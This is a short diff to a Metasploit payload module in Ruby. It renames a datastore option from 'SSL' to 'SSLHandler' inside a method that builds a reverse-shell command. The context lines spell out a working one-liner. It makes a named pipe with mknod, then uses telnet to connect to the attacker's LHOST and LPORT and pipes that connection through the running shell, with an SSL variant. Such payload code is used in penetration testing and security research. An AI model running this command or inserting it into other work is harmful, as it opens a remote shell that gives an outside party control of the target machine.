@@ -57,7 +57,7 @@ module Metasploit3
 	#
 	def command_string
 		pipe_name = Rex::Text.rand_text_alpha( rand(4) + 8 )
-		if datastore['SSL']
+		if datastore['SSLHandler']
 			cmd = "mknod #{pipe_name} p && telnet -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
 		else
 			cmd = "mknod #{pipe_name} p && telnet #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
